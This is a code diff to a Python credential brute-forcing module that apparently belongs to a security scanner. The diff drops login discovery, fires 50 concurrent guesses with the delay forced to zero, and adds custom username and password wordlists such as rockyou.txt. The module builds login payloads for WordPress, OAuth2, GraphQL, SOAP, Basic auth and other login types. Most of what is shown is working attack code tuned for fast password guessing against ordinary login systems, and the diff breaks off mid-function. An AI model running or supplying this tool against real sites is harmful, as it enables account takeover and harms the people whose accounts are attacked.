@@ -1,140 +1,137 @@
 import asyncio
+import sys
 from typing import List, Dict, Optional, Tuple, Set
 from core.base_module import BaseModule, Finding
 from pathlib import Path
 
 
 class CredentialTester(BaseModule):
-    """Test for brute force vulnerabilities with stealth - NO DELAY VERSION"""
+    """Test for brute force vulnerabilities - CONCURRENT NO-DELAY VERSION"""
 
-    # ─────────────────────────────────────────────────────────
-    # Form-type registry
-    # Each entry describes how to detect and attack a form type.
-    # ─────────────────────────────────────────────────────────
     FORM_TYPE_REGISTRY = {
-        # ── Standard HTML <form> ──────────────────────────────
-        'html_form': {
-            'description': 'Classic HTML form with POST',
-            'content_type': 'application/x-www-form-urlencoded',
-            'method': 'POST',
-        },
-        # ── REST JSON API ─────────────────────────────────────
-        'json_api': {
-            'description': 'REST endpoint that accepts JSON body',
-            'content_type': 'application/json',
-            'method': 'POST',
-        },
-        # ── GraphQL ───────────────────────────────────────────
-        'graphql': {
-            'description': 'GraphQL mutation for login',
-            'content_type': 'application/json',
-            'method': 'POST',
-        },
-        # ── OAuth2 / Token endpoint ───────────────────────────
-        'oauth2': {
-            'description': 'OAuth2 password-grant or token endpoint',
-            'content_type': 'application/x-www-form-urlencoded',
-            'method': 'POST',
-        },
-        # ── Basic-Auth ────────────────────────────────────────
-        'basic_auth': {
-            'description': 'HTTP Basic Authentication (Authorization header)',
-            'content_type': None,
-            'method': 'GET',
-        },
-        # ── XML / SOAP ────────────────────────────────────────
-        'xml_soap': {
-            'description': 'SOAP/XML web-service login',
-            'content_type': 'text/xml',
-            'method': 'POST',
-        },
-        # ── Multipart form ───────────────────────────────────
-        'multipart_form': {
-            'description': 'HTML multipart/form-data (file-upload forms)',
-            'content_type': 'multipart/form-data',
-            'method': 'POST',
-        },
-        # ── JWT refresh / login ───────────────────────────────
-        'jwt_login': {
-            'description': 'Endpoint that issues a JWT on login',
-            'content_type': 'application/json',
-            'method': 'POST',
-        },
-        # ── AJAX / XHR form ───────────────────────────────────
-        'ajax_form': {
-            'description': 'AJAX-driven login (XMLHttpRequest / fetch)',
-            'content_type': 'application/json',
-            'method': 'POST',
-        },
-        # ── WordPress wp-login.php ────────────────────────────
-        'wordpress': {
-            'description': 'WordPress wp-login.php form',
-            'content_type': 'application/x-www-form-urlencoded',
-            'method': 'POST',
-        },
-        # ── Digest Auth ───────────────────────────────────────
-        'digest_auth': {
-            'description': 'HTTP Digest Authentication',
-            'content_type': None,
-            'method': 'GET',
-        },
+        'html_form':      {'description': 'Classic HTML form with POST',                     'content_type': 'application/x-www-form-urlencoded', 'method': 'POST'},
+        'json_api':       {'description': 'REST endpoint that accepts JSON body',             'content_type': 'application/json',                  'method': 'POST'},
+        'graphql':        {'description': 'GraphQL mutation for login',                       'content_type': 'application/json',                  'method': 'POST'},
+        'oauth2':         {'description': 'OAuth2 password-grant or token endpoint',          'content_type': 'application/x-www-form-urlencoded', 'method': 'POST'},
+        'basic_auth':     {'description': 'HTTP Basic Authentication (Authorization header)', 'content_type': None,                                'method': 'GET'},
+        'xml_soap':       {'description': 'SOAP/XML web-service login',                       'content_type': 'text/xml',                          'method': 'POST'},
+        'multipart_form': {'description': 'HTML multipart/form-data (file-upload forms)',     'content_type': 'multipart/form-data',               'method': 'POST'},
+        'jwt_login':      {'description': 'Endpoint that issues a JWT on login',              'content_type': 'application/json',                  'method': 'POST'},
+        'ajax_form':      {'description': 'AJAX-driven login (XMLHttpRequest / fetch)',       'content_type': 'application/json',                  'method': 'POST'},
+        'wordpress':      {'description': 'WordPress wp-login.php form',                      'content_type': 'application/x-www-form-urlencoded', 'method': 'POST'},
+        'digest_auth':    {'description': 'HTTP Digest Authentication',                       'content_type': None,                                'method': 'GET'},
     }
 
     def __init__(self, config, stealth=None, db=None, graph_manager=None):
         super().__init__(config, stealth, db, graph_manager)
-        self.max_attempts   = config.get('max_attempts', 1000)
-        self.delay          = 0  # FORCE NO DELAY
-        self.wordlist_path  = config.get('wordlist_path', 'wordlists')
-        # ── Concurrency: how many requests fly simultaneously ──
-        # 50 is safe for CTF targets; raise to 100-200 if the
-        # target is local / doesn't throttle connections.
-        self.concurrency    = config.get('concurrency', 50)
+        self.max_attempts    = config.get('max_attempts', 1000)
+        self.delay           = 0
+        self.wordlist_path   = config.get('wordlist_path', 'wordlists')
+        self.concurrency     = config.get('concurrency', 50)
+        # ── Custom wordlist overrides ──────────────────────────────────────────
+        # Pass via config:  {'userlist': '/path/users.txt', 'passlist': '/path/rockyou.txt'}
+        # Or via CLI flags: --userlist /path/users.txt  --passlist /path/rockyou.txt
+        self.custom_userlist = config.get('userlist', None)
+        self.custom_passlist = config.get('passlist', None)
 
-    # ─────────────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    # Progress bar (pure terminal, no extra dependencies)
+    # ─────────────────────────────────────────────────────────────────────────
+    def _print_progress(self, current: int, total: int, prefix: str = 'Progress', width: int = 40):
+        """
+        Print an in-place progress bar.
+        Example:  Progress: [████████████░░░░░░░░░░░░░░] 45.2%  4520/10000
+        """
+        if total == 0:
+            return
+        pct   = current / total
+        filled = int(width * pct)
+        bar   = '█' * filled + '░' * (width - filled)
+        line  = f'\r\033[96m{prefix}:\033[0m [{bar}] \033[93m{pct*100:5.1f}%\033[0m  {current}/{total}'
+        sys.stdout.write(line)
+        sys.stdout.flush()
+        if current >= total:
+            sys.stdout.write('\n')
+            sys.stdout.flush()
+
+    # ─────────────────────────────────────────────────────────────────────────
     # Entry point
-    # ─────────────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
     async def run(self, target: str, **kwargs) -> List[Finding]:
-        """Run brute force tests"""
-        self.logger.info(f"Testing brute force protections on {target}")
+        """Run brute force tests — skips straight to attacking the given URL"""
+        self.logger.info(f"Starting brute force on {target}")
 
         if not kwargs.get('enable_brute_force', False):
             self.logger.info("Brute force testing disabled (use --enable-brute-force to enable)")
             return self.findings
 
-        login_endpoints = await self._discover_login_forms(target)
+        # ── Pull custom wordlists from kwargs if passed via CLI ───────────────
+        if kwargs.get('userlist'):
+            self.custom_userlist = kwargs['userlist']
+        if kwargs.get('passlist'):
+            self.custom_passlist = kwargs['passlist']
 
+        # ── Print wordlist banner ─────────────────────────────────────────────
+        ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt (default)"
+        plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt (default)"
+        print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
+        print(f"\033[96m[*] Passlist : {plist_label}\033[0m")
+
+        # ── Build endpoint directly from the supplied target URL ──────────────
         target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"
-        target_exists = any(ep['url'] == target_url for ep in login_endpoints)
 
-        if not target_exists:
-            self.logger.info(f"Adding direct target test: {target_url}")
-            login_endpoints.insert(0, {
-                'url': target_url,
-                'type': 'direct',
-                'form_type': 'html_form',
-                'fields': {
-                    'username_fields': ['email', 'username', 'user', 'login', 'name'],
-                    'password_field': 'password',
-                    'username_field': 'email',
-                    'email_field': 'email'
-                },
-                'discovered_at': 'direct_target'
-            })
+        # Quickly probe the target to detect form type — single request only
+        endpoint = await self._probe_single_endpoint(target_url)
 
-        if not login_endpoints:
-            self.logger.warning("No login endpoints discovered")
-            return self.findings
+        print(f"\033[96m[*] Form type detected: \033[93m{endpoint['form_type']}\033[0m")
+        print(f"\033[96m[*] Target URL        : {endpoint['url']}\033[0m\n")
 
-        self.logger.info(f"Brute forcing {len(login_endpoints)} endpoint(s) directly — NO DELAY")
-
-        for endpoint in login_endpoints:
-            await self._test_brute_force(endpoint)
-
+        await self._test_brute_force(endpoint)
         return self.findings
 
-    # ─────────────────────────────────────────────────────────
-    # Discovery
-    # ─────────────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    # Single fast probe — replaces the slow full discovery scan
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _probe_single_endpoint(self, url: str) -> Dict:
+        """
+        Fire ONE request to the target URL to detect form type and fields.
+        Falls back to safe html_form defaults if the request fails.
+        This replaces _discover_login_forms for the direct-target workflow.
+        """
+        default_fields = {
+            'username_fields': ['email', 'username', 'user', 'login', 'name'],
+            'password_field':  'password',
+            'username_field':  'email',
+            'email_field':     'email',
+            'inputs':          [],
+            'action':          '',
+            'method':          'POST',
+        }
+
+        try:
+            response = await self._make_request(url)
+            if response:
+                text    = await response.text()
+                headers = response.headers
+                ft      = self._detect_form_type(url, text, headers)
+                fields  = self._extract_form_fields(text)
+            else:
+                ft, fields = 'html_form', default_fields
+        except Exception as e:
+            self.logger.warning(f"Probe failed ({e}), using html_form defaults")
+            ft, fields = 'html_form', default_fields
+
+        return {
+            'url':       url,
+            'type':      'direct',
+            'form_type': ft,
+            'fields':    fields,
+            'is_api':    ft in ('json_api', 'graphql', 'oauth2', 'jwt_login', 'ajax_form'),
+        }
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Discovery (kept for compatibility — no longer called in run())
+    # ─────────────────────────────────────────────────────────────────────────
     async def _discover_login_forms(self, target: str) -> List[Dict]:
         """Discover login endpoints using multiple strategies"""
         import re
@@ -149,32 +146,22 @@ class CredentialTester(BaseModule):
         base = f"{parsed.scheme}://{parsed.netloc}"
 
         candidate_urls = [target]
-
         common_paths = [
-            # Standard auth paths
             '/login', '/signin', '/auth', '/authenticate',
             '/admin', '/admin/login', '/user/login', '/account/login',
-            # API paths
             '/api/login', '/api/auth', '/api/token', '/oauth/token',
             '/api/v1/login', '/api/v2/login', '/api/v1/auth', '/api/v2/auth',
             '/api/v1/token', '/api/v2/token',
-            # GraphQL
             '/graphql', '/api/graphql',
-            # REST variants
             '/rest/login', '/json/login', '/ajax/login',
-            # CMS paths
             '/wp-login.php', '/administrator/index.php',
             '/admin.html', '/login.html', '/signin.html',
-            # App-specific
             '/auth/login', '/user/signin', '/member/login',
             '/dashboard/login', '/manage/login', '/control/login',
-            # JWT / OAuth
             '/auth/token', '/oauth/authorize', '/connect/token',
             '/identity/connect/token',
-            # SOAP / XML services
             '/service', '/services', '/ws', '/soap',
         ]
-
         for path in common_paths:
             candidate_urls.append(base + path)
 
@@ -185,433 +172,283 @@ class CredentialTester(BaseModule):
             if url in seen_urls:
                 continue
             seen_urls.add(url)
-
             try:
-                self.logger.debug(f"Checking: {url}")
                 response = await self._make_request(url)
                 if not response:
                     continue
                 if response.status not in [200, 301, 302, 401, 403, 405, 500]:
                     continue
-
                 text = await response.text()
                 if not text:
                     continue
 
-                # Detect form type first
                 form_type = self._detect_form_type(url, text, response.headers)
-
-                indicators = [
-                    'password', 'login', 'username', 'email', 'sign in', 'log in',
-                    'signin', 'passwd', 'credentials', 'authentication',
-                    'auth', 'token', 'session', 'oauth', 'sso'
-                ]
+                indicators = ['password','login','username','email','sign in','log in',
+                              'signin','passwd','credentials','authentication','auth','token','session','oauth','sso']
                 has_login_indicators = any(ind in text.lower() for ind in indicators)
-
-                fields = self._extract_form_fields(text)
-
-                is_api = 'application/json' in response.headers.get('Content-Type', '') or \
-                         text.strip().startswith(('{', '['))
-
-                js_frameworks = ['react', 'vue', 'angular', 'ember', 'next.js', 'nuxt']
-                has_js_framework = any(fw in text.lower() for fw in js_frameworks)
-
-                # Accept basic-auth / digest challenges even on 401
+                fields  = self._extract_form_fields(text)
+                is_api  = 'application/json' in response.headers.get('Content-Type','') or text.strip().startswith(('{','['))
+                js_fws  = ['react','vue','angular','ember','next.js','nuxt']
+                has_js  = any(fw in text.lower() for fw in js_fws)
                 is_http_auth = response.status == 401 and 'WWW-Authenticate' in response.headers
 
-                if has_login_indicators or fields['inputs'] or is_api or has_js_framework or is_http_auth or form_type != 'html_form':
-
+                if has_login_indicators or fields['inputs'] or is_api or has_js or is_http_auth or form_type != 'html_form':
+                    from urllib.parse import urljoin
                     post_url = url
                     if fields.get('action'):
                         action = fields['action']
-                        if action.startswith('http'):
-                            post_url = action
-                        elif action.startswith('/'):
-                            post_url = base + action
-                        else:
-                            post_url = urljoin(url, action)
+                        post_url = action if action.startswith('http') else (base + action if action.startswith('/') else urljoin(url, action))
 
-                    endpoint_info = {
-                        'url': post_url,
-                        'type': 'api' if is_api else ('js_framework' if has_js_framework else 'form'),
-                        'form_type': form_type,
-                        'fields': fields,
-                        'discovered_at': url,
-                        'indicators_found': has_login_indicators,
-                        'is_api': is_api,
+                    endpoints.append({
+                        'url': post_url, 'type': 'api' if is_api else ('js_framework' if has_js else 'form'),
+                        'form_type': form_type, 'fields': fields, 'discovered_at': url,
+                        'indicators_found': has_login_indicators, 'is_api': is_api,
                         'is_http_auth': is_http_auth,
-                        'www_authenticate': response.headers.get('WWW-Authenticate', ''),
-                    }
-
-                    endpoints.append(endpoint_info)
-                    self.logger.info(
-                        f"Found login endpoint: {post_url} "
-                        f"(form_type={form_type}, type={endpoint_info['type']}, from={url})"
-                    )
-
+                        'www_authenticate': response.headers.get('WWW-Authenticate',''),
+                    })
+                    self.logger.info(f"Found login endpoint: {post_url} (form_type={form_type})")
             except Exception as e:
                 self.logger.debug(f"Login discovery error on {url}: {e}")
 
-        # Deduplicate
         seen: Set[str] = set()
         unique = []
         for ep in endpoints:
             if ep['url'] not in seen:
                 seen.add(ep['url'])
                 unique.append(ep)
-
         return unique
 
-    # ─────────────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
     # Form-type detection
-    # ─────────────────────────────────────────────────────────
-    def _detect_form_type(self, url: str, html: str, headers: Dict) -> str:
-        """
-        Analyse the URL, response headers, and body to classify the login
-        form/endpoint into one of the known FORM_TYPE_REGISTRY keys.
-        Returns the best-matching form_type string.
-        """
+    # ─────────────────────────────────────────────────────────────────────────
+    def _detect_form_type(self, url: str, html: str, headers) -> str:
         import re
         url_lower  = url.lower()
         html_lower = html.lower() if html else ''
         ct         = headers.get('Content-Type', '').lower() if headers else ''
         www_auth   = headers.get('WWW-Authenticate', '').lower() if headers else ''
 
-        # ── Digest Auth ───────────────────────────────────────
-        if 'digest' in www_auth:
-            return 'digest_auth'
-
-        # ── Basic Auth ────────────────────────────────────────
-        if 'basic' in www_auth:
-            return 'basic_auth'
-
-        # ── SOAP / XML ────────────────────────────────────────
-        soap_url_hints = ['/soap', '/ws/', '/wsdl', '/service', '/services']
-        soap_body_hints = ['<soap:', 'wsdl', 'xmlns:soap', 'soapenv:', 'text/xml', 'application/soap']
-        if any(h in url_lower for h in soap_url_hints) or \
-           any(h in html_lower for h in soap_body_hints) or \
-           'xml' in ct:
-            return 'xml_soap'
-
-        # ── WordPress ─────────────────────────────────────────
-        if 'wp-login' in url_lower or \
-           ('wordpress' in html_lower and 'log in' in html_lower):
-            return 'wordpress'
-
-        # ── GraphQL ───────────────────────────────────────────
-        graphql_url_hints = ['/graphql', '/gql', '/graph']
-        graphql_body_hints = ['__schema', 'mutation', 'query{', 'query {', 'graphql']
-        if any(h in url_lower for h in graphql_url_hints) or \
-           any(h in html_lower for h in graphql_body_hints):
-            return 'graphql'
-
-        # ── OAuth2 / Token ────────────────────────────────────
-        oauth_url_hints = ['/oauth', '/token', '/connect/token', '/identity/connect']
-        oauth_body_hints = ['grant_type', 'client_id', 'client_secret', 'access_token', 'oauth']
-        if any(h in url_lower for h in oauth_url_hints) or \
-           any(h in html_lower for h in oauth_body_hints):
-            return 'oauth2'
-
-        # ── JWT login ─────────────────────────────────────────
-        jwt_url_hints = ['/jwt', '/api/token', '/api/auth', '/api/login']
-        jwt_body_hints = ['access_token', 'refresh_token', 'jwt', 'bearer']
-        if any(h in url_lower for h in jwt_url_hints) or \
-           any(h in html_lower for h in jwt_body_hints):
-            return 'jwt_login'
-
-        # ── Multipart form ────────────────────────────────────
-        if 'multipart' in html_lower or \
-           re.search(r'enctype=["\']multipart', html_lower):
-            return 'multipart_form'
-
-        # ── AJAX / XHR form ───────────────────────────────────
-        ajax_hints = ['xmlhttprequest', 'fetch(', 'axios', '$.ajax', '$.post',
-                      'x-requested-with', 'json.stringify']
-        if any(h in html_lower for h in ajax_hints):
-            return 'ajax_form'
-
-        # ── JSON API ──────────────────────────────────────────
-        if 'application/json' in ct or \
-           html.strip().startswith(('{', '[')) or \
-           any(h in url_lower for h in ['/api/', '/rest/']):
-            return 'json_api'
-
-        # ── Default: classic HTML form ─────────────────────────
+        if 'digest' in www_auth:                                                  return 'digest_auth'
+        if 'basic'  in www_auth:                                                  return 'basic_auth'
+        if any(h in url_lower for h in ['/soap','/ws/','/wsdl','/service','/services']) \
+           or any(h in html_lower for h in ['<soap:','wsdl','xmlns:soap','soapenv:']) \
+           or 'xml' in ct:                                                        return 'xml_soap'
+        if 'wp-login' in url_lower or ('wordpress' in html_lower and 'log in' in html_lower): return 'wordpress'
+        if any(h in url_lower for h in ['/graphql','/gql','/graph']) \
+           or any(h in html_lower for h in ['__schema','mutation','query{','query {','graphql']): return 'graphql'
+        if any(h in url_lower for h in ['/oauth','/token','/connect/token','/identity/connect']) \
+           or any(h in html_lower for h in ['grant_type','client_id','client_secret','access_token','oauth']): return 'oauth2'
+        if any(h in url_lower for h in ['/jwt','/api/token','/api/auth','/api/login']) \
+           or any(h in html_lower for h in ['access_token','refresh_token','jwt','bearer']):  return 'jwt_login'
+        if 'multipart' in html_lower or re.search(r'enctype=["\']multipart', html_lower):    return 'multipart_form'
+        if any(h in html_lower for h in ['xmlhttprequest','fetch(','axios','$.ajax','$.post','x-requested-with','json.stringify']): return 'ajax_form'
+        if 'application/json' in ct or html.strip().startswith(('{','[')) \
+           or any(h in url_lower for h in ['/api/','/rest/']):                    return 'json_api'
         return 'html_form'
 
-    # ─────────────────────────────────────────────────────────
-    # Payload builders (one per form type)
-    # ─────────────────────────────────────────────────────────
-    def _build_payload(
-        self,
-        form_type: str,
-        username: str,
-        password: str,
-        username_fields: List[str],
-        password_field: str,
-    ) -> Dict:
-        """
-        Return a dict with keys:
-          data    – body payload (dict or str)
-          headers – extra request headers
-          method  – HTTP verb
-          use_json – True → send as JSON, False → form-encoded
-          use_basic_auth – True → use HTTP Basic Auth tuple
-          basic_auth_tuple – (user, pass) when use_basic_auth is True
-        """
-        result = {
-            'data': {},
-            'headers': {},
-            'method': 'POST',
-            'use_json': False,
-            'use_basic_auth': False,
-            'basic_auth_tuple': None,
-        }
+    # ─────────────────────────────────────────────────────────────────────────
+    # Payload builders
+    # ─────────────────────────────────────────────────────────────────────────
+    def _build_payload(self, form_type, username, password, username_fields, password_field):
+        result = {'data': {}, 'headers': {}, 'method': 'POST', 'use_json': False,
+                  'use_basic_auth': False, 'basic_auth_tuple': None}
 
         if form_type == 'html_form':
             payload = {password_field: password}
-            for f in username_fields:
-                payload[f] = username
+            for f in username_fields: payload[f] = username
             result['data'] = payload
             result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
 
         elif form_type == 'json_api':
             payload = {password_field: password}
-            for f in username_fields:
-                payload[f] = username
-            result['data'] = payload
-            result['use_json'] = True
+            for f in username_fields: payload[f] = username
+            result['data'] = payload; result['use_json'] = True
             result['headers']['Content-Type'] = 'application/json'
 
         elif form_type == 'graphql':
-            # Build a generic GraphQL login mutation
             ufield = username_fields[0] if username_fields else 'email'
-            mutation = (
-                f'mutation {{ login({ufield}: "{username}", '
-                f'{password_field}: "{password}") '
-                f'{{ token user {{ id email }} }} }}'
-            )
-            result['data'] = {'query': mutation}
-            result['use_json'] = True
+            mutation = (f'mutation {{ login({ufield}: "{username}", {password_field}: "{password}") '
+                        f'{{ token user {{ id email }} }} }}')
+            result['data'] = {'query': mutation}; result['use_json'] = True
             result['headers']['Content-Type'] = 'application/json'
 
         elif form_type == 'oauth2':
-            result['data'] = {
-                'grant_type': 'password',
-                'username': username,
-                'password': password,
-                'scope': 'openid profile email',
-            }
+            result['data'] = {'grant_type':'password','username':username,'password':password,'scope':'openid profile email'}
             result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
 
-        elif form_type == 'basic_auth':
-            result['use_basic_auth'] = True
-            result['basic_auth_tuple'] = (username, password)
-            result['method'] = 'GET'
-
-        elif form_type == 'digest_auth':
-            result['use_basic_auth'] = True
-            result['basic_auth_tuple'] = (username, password)
+        elif form_type in ('basic_auth', 'digest_auth'):
+            result['use_basic_auth'] = True; result['basic_auth_tuple'] = (username, password)
             result['method'] = 'GET'
 
         elif form_type == 'xml_soap':
-            xml_body = (
+            result['data'] = (
                 '<?xml version="1.0" encoding="utf-8"?>'
                 '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
-                '<soap:Body>'
-                '<Login xmlns="http://tempuri.org/">'
-                f'<username>{username}</username>'
-                f'<password>{password}</password>'
-                '</Login>'
-                '</soap:Body>'
-                '</soap:Envelope>'
-            )
-            result['data'] = xml_body
+                '<soap:Body><Login xmlns="http://tempuri.org/">'
+                f'<username>{username}</username><password>{password}</password>'
+                '</Login></soap:Body></soap:Envelope>')
             result['headers']['Content-Type'] = 'text/xml; charset=utf-8'
-            result['headers']['SOAPAction'] = '"Login"'
+            result['headers']['SOAPAction']   = '"Login"'
 
         elif form_type == 'multipart_form':
             payload = {password_field: password}
-            for f in username_fields:
-                payload[f] = username
+            for f in username_fields: payload[f] = username
             result['data'] = payload
-            # aiohttp handles multipart when data is a dict + explicit header omitted
             result['headers']['Content-Type'] = 'multipart/form-data'
 
         elif form_type in ('jwt_login', 'ajax_form'):
             payload = {password_field: password}
-            for f in username_fields:
-                payload[f] = username
-            result['data'] = payload
-            result['use_json'] = True
+            for f in username_fields: payload[f] = username
+            result['data'] = payload; result['use_json'] = True
             result['headers']['Content-Type'] = 'application/json'
             if form_type == 'ajax_form':
                 result['headers']['X-Requested-With'] = 'XMLHttpRequest'
 
         elif form_type == 'wordpress':
-            result['data'] = {
-                'log': username,
-                'pwd': password,
-                'wp-submit': 'Log In',
-                'redirect_to': '/wp-admin/',
-                'testcookie': '1',
-            }
+            result['data'] = {'log': username, 'pwd': password, 'wp-submit': 'Log In',
+                              'redirect_to': '/wp-admin/', 'testcookie': '1'}
             result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
-            result['headers']['Cookie'] = 'wordpress_test_cookie=WP+Cookie+check'
+            result['headers']['Cookie']       = 'wordpress_test_cookie=WP+Cookie+check'
 
         else:
-            # Fallback: plain form POST
             payload = {password_field: password}
-            for f in username_fields:
-                payload[f] = username
+            for f in username_fields: payload[f] = username
             result['data'] = payload
             result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
 
         return result
 
-    # ─────────────────────────────────────────────────────────
-    # Field extraction (unchanged from original)
-    # ─────────────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    # Field extraction
+    # ─────────────────────────────────────────────────────────────────────────
     def _extract_form_fields(self, html: str) -> Dict:
-        """Extract form fields from HTML/JS with comprehensive detection"""
         import re
-        fields = {
-            'inputs': [],
-            'username_fields': [],
-            'password_field': None,
-            'action': '',
-            'method': 'POST'
-        }
-
+        fields = {'inputs': [], 'username_fields': [], 'password_field': None, 'action': '', 'method': 'POST'}
         if not html:
             return fields
 
-        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', html, re.IGNORECASE)
+        inputs    = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', html, re.IGNORECASE)
         js_inputs = re.findall(r'name["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
-
-        common_patterns = [
-            r'["\'](email|username|user|login|name)["\']',
-            r'["\'](password|passwd|pwd|pass)["\']',
-            r'["\'](token|auth|session)["\']'
-        ]
-        for pattern in common_patterns:
-            matches = re.findall(pattern, html, re.IGNORECASE)
-            inputs.extend(matches)
-
+        for pattern in [r'["\'](email|username|user|login|name)["\']',
+                        r'["\'](password|passwd|pwd|pass)["\']',
+                        r'["\'](token|auth|session)["\']']:
+            inputs.extend(re.findall(pattern, html, re.IGNORECASE))
         fields['inputs'] = list(set(inputs + js_inputs))
 
-        action_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
-        if action_match:
-            fields['action'] = action_match.group(1)
+        action_m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
+        if action_m: fields['action'] = action_m.group(1)
+        method_m = re.search(r'<form[^>]+method=["\']([^"\']+)["\']', html, re.IGNORECASE)
+        if method_m: fields['method'] = method_m.group(1).upper()
 
-        method_match = re.search(r'<form[^>]+method=["\']([^"\']+)["\']', html, re.IGNORECASE)
-        if method_match:
-            fields['method'] = method_match.group(1).upper()
-
-        username_patterns = [
-            'email', 'mail', 'e-mail', 'username', 'user', 'uname',
-            'login', 'name', 'account', 'userid', 'user_id', 'auth_user',
-            'identity', 'identifier', 'phone', 'mobile', 'cell'
-        ]
-        password_patterns = [
-            'password', 'passwd', 'pwd', 'pass', 'user_password',
-            'auth_pass', 'secret', 'key', 'credential'
-        ]
+        u_patterns = ['email','mail','e-mail','username','user','uname','login','name',
+                      'account','userid','user_id','auth_user','identity','identifier','phone','mobile','cell']
+        p_patterns = ['password','passwd','pwd','pass','user_password','auth_pass','secret','key','credential']
 
         for inp in fields['inputs']:
-            inp_lower = inp.lower()
-            for pattern in username_patterns:
-                if pattern in inp_lower and inp not in fields['username_fields']:
-                    fields['username_fields'].append(inp)
-                    break
+            for pat in u_patterns:
+                if pat in inp.lower() and inp not in fields['username_fields']:
+                    fields['username_fields'].append(inp); break
 
         for inp in fields['inputs']:
-            inp_lower = inp.lower()
-            for pattern in password_patterns:
-                if pattern in inp_lower:
-                    fields['password_field'] = inp
-                    break
-            if fields['password_field']:
-                break
+            for pat in p_patterns:
+                if pat in inp.lower():
+                    fields['password_field'] = inp; break
+            if fields['password_field']: break
 
         if not fields['username_fields']:
-            html_lower = html.lower()
-            if 'email' in html_lower or 'e-mail' in html_lower:
-                fields['username_fields'] = ['email', 'username', 'user']
-            elif 'username' in html_lower:
-                fields['username_fields'] = ['username', 'email', 'user']
-            else:
-                fields['username_fields'] = ['email', 'username', 'user', 'login', 'name']
-
-        if not fields['password_field']:
-            fields['password_field'] = 'password'
+            hl = html.lower()
+            if 'email' in hl or 'e-mail' in hl: fields['username_fields'] = ['email','username','user']
+            elif 'username' in hl:               fields['username_fields'] = ['username','email','user']
+            else:                                fields['username_fields'] = ['email','username','user','login','name']
+        if not fields['password_field']:         fields['password_field']  = 'password'
 
         fields['username_field'] = fields['username_fields'][0]
-        fields['email_field'] = fields['username_fields'][0]
-
-        self.logger.debug(f"Detected fields: {fields['username_fields']} / {fields['password_field']}")
+        fields['email_field']    = fields['username_fields'][0]
         return fields
 
-    # ─────────────────────────────────────────────────────────
-    # Wordlist helpers (unchanged from original)
-    # ─────────────────────────────────────────────────────────
+    # ─────────────────────────────────────────────────────────────────────────
+    # Wordlist loader  — now respects custom_userlist / custom_passlist
+    # ─────────────────────────────────────────────────────────────────────────
     def _load_wordlists(self) -> Tuple[List[str], List[str]]:
-        """Load usernames and passwords from wordlists"""
-        usernames = []
-        passwords = []
+        """
+        Load usernames and passwords.
 
-        user_file = Path(self.wordlist_path) / 'usernames.txt'
-        if user_file.exists():
-            with open(user_file, 'r') as f:
-                usernames = [line.strip() for line in f if line.strip()]
-            self.logger.info(f"Loaded {len(usernames)} usernames")
-        else:
-            self.logger.warning(f"Usernames file not found: {user_file}")
-            usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']
+        Priority order
+        ──────────────
+        1. self.custom_userlist / self.custom_passlist  (--userlist / --passlist CLI flags)
+        2. wordlists/usernames.txt  /  wordlists/passwords.txt  (default paths)
+        3. Built-in fallback mini-lists
+        """
+        usernames: List[str] = []
+        passwords: List[str] = []
 
-        pass_file = Path(self.wordlist_path) / 'passwords.txt'
-        if pass_file.exists():
-            with open(pass_file, 'r') as f:
-                passwords = [line.strip() for line in f if line.strip()]
-            self.logger.info(f"Loaded {len(passwords)} passwords")
-        else:
-            self.logger.warning(f"Passwords file not found: {pass_file}")
-            passwords = ['admin', 'password', '123456', 'login', 'admin123']
+        # ── Usernames ─────────────────────────────────────────
+        if self.custom_userlist:
+            upath = Path(self.custom_userlist)
+            if upath.exists():
+                with open(upath, 'r', errors='ignore') as f:
+                    usernames = [l.strip() for l in f if l.strip()]
+                print(f"\033[92m[+] Custom userlist loaded : {upath} ({len(usernames)} entries)\033[0m")
+            else:
+                self.logger.warning(f"Custom userlist not found: {upath}, falling back to default")
 
+        if not usernames:
+            upath = Path(self.wordlist_path) / 'usernames.txt'
+            if upath.exists():
+                with open(upath, 'r', errors='ignore') as f:
+                    usernames = [l.strip() for l in f if l.strip()]
+                print(f"\033[92m[+] Userlist loaded        : {upath} ({len(usernames)} entries)\033[0m")
+            else:
+                usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']
+                print(f"\033[93m[!] No userlist found — using {len(usernames)} built-in defaults\033[0m")
+
+        # ── Passwords ─────────────────────────────────────────
+        if self.custom_passlist:
+            ppath = Path(self.custom_passlist)
+            if ppath.exists():
+                with open(ppath, 'r', errors='ignore') as f:
+                    passwords = [l.strip() for l in f if l.strip()]
+                print(f"\033[92m[+] Custom passlist loaded : {ppath} ({len(passwords)} entries)\033[0m")
+            else:
+                self.logger.warning(f"Custom passlist not found: {ppath}, falling back to default")
+
+        if not passwords:
+            ppath = Path(self.wordlist_path) / 'passwords.txt'
+            if ppath.exists():
+                with open(ppath, 'r', errors='ignore') as f:
+                    passwords = [l.strip() for l in f if l.strip()]
+                print(f"\033[92m[+] Passlist loaded        : {ppath} ({len(passwords)} entries)\033[0m")
+            else:
+                passwords = ['admin', 'password', '123456', 'login', 'admin123']
+                print(f"\033[93m[!] No passlist found — using {len(passwords)} built-in defaults\033[0m")
+
+        print()
         return usernames, passwords
 
     def _generate_username_variations(self, base_usernames: List[str]) -> Set[str]:
-        """Generate all possible username variations"""
